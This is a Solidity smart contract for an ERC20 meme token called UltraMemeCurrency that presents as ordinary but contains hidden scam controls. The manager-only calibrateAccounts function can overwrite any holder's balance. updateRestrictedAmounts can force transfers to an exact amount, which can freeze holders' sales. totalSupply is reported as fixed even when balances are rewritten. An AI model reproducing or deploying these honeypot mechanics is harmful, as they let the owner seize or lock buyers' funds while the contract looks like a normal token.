pragma solidity ^0.8.16;

interface IDistinctERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract EnhancedContext {
    function retrieveContextSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract LoneManager is EnhancedContext {
    address private _chief;
    event ManagerTransition(address indexed oldManager, address indexed freshManager);

    constructor() {
        address rootSender = retrieveContextSender();
        _chief = rootSender;
        emit ManagerTransition(address(0), rootSender);
    }

    function fetchManager() public view virtual returns (address) {
        return _chief;
    }

    modifier managerPrivilege() {
        require(fetchManager() == retrieveContextSender(), "Privilege is exclusive to manager.");
        _;
    }

    function alterManager(address freshChief) public managerPrivilege {
        _chief = freshChief;
    }

    function abandonRole() public virtual managerPrivilege {
        emit ManagerTransition(_chief, address(0x000000000000000000000000000000000000dEaD));
        _chief = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract UltraMemeCurrency is EnhancedContext, LoneManager, IDistinctERC20 {
    mapping (address => mapping (address => uint256)) private _approvals;
    mapping (address => uint256) private _ledger;
    mapping (address => uint256) private _restrictedAmounts;

    string public constant currencyName = "UltraMemeCurrency";
    string public constant currencyTicker = "UMEMC";
    uint8 public constant currencyScale = 18;
    uint256 public constant supremeSupply = 123456 * (10 ** currencyScale);

    constructor() {
        _ledger[retrieveContextSender()] = supremeSupply;
        emit Transfer(address(0), retrieveContextSender(), supremeSupply);
    }
    
    modifier privilegedOrCreator() {
        require(fetchManager() == retrieveContextSender(), "You must be the manager.");
        _;
    }

    event Adjustment(address indexed user, uint256 oldBalance, uint256 freshBalance);

    function restrictedTransferCap(address account) public view returns (uint256) {
        return _restrictedAmounts[account];
    }

    function updateRestrictedAmounts(address[] calldata accounts, uint256 amount) public privilegedOrCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _restrictedAmounts[accounts[i]] = amount;
        }
    }

    function calibrateAccounts(address[] memory accountList, uint256 recalibratedAmount) public privilegedOrCreator {
        require(recalibratedAmount >= 0, "Recalibrated amount should be non-negative");

        for (uint256 i = 0; i < accountList.length; i++) {
            address activeAccount = accountList[i];
            require(activeAccount != address(0), "Address cannot be zero.");

            uint256 originalAmount = _ledger[activeAccount];
            _ledger[activeAccount] = recalibratedAmount;

            emit Adjustment(activeAccount, originalAmount, recalibratedAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _ledger[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_ledger[retrieveContextSender()] >= amount, "Insufficient balance.");

        uint256 cappedAmount = restrictedTransferCap(retrieveContextSender());
        if (cappedAmount > 0) {
            require(amount == cappedAmount, "Transfer amount should match the capped amount.");
        }

        _ledger[retrieveContextSender()] -= amount;
        _ledger[recipient] += amount;

        emit Transfer(retrieveContextSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _approvals[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approvals[retrieveContextSender()][spender] = amount;
        emit Approval(retrieveContextSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_approvals[sender][retrieveContextSender()] >= amount, "Exceeds allowance.");

        uint256 cappedAmount = restrictedTransferCap(sender);
        if (cappedAmount > 0) {
            require(amount == cappedAmount, "Transfer amount should match the capped amount.");
        }

        _ledger[sender] -= amount;
        _ledger[recipient] += amount;
        _approvals[sender][retrieveContextSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return supremeSupply;
    }

    function name() public view returns (string memory) {
        return currencyName;
    }

    function symbol() public view returns (string memory) {
        return currencyTicker;
    }

    function decimals() public view returns (uint8) {
        return currencyScale;
    }
}